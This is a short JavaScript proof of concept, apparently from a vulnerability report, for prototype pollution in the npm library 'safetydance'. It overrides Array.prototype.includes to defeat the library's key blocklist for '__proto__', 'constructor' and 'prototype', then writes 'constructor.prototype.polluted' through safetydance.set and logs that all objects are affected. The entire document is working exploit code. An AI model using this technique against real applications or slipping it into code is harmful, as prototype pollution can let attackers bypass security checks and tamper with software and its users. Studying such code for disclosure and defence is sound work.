Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const safetydance = require('safetydance');
obj = {};
console.log({}.polluted);
safetydance.set({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);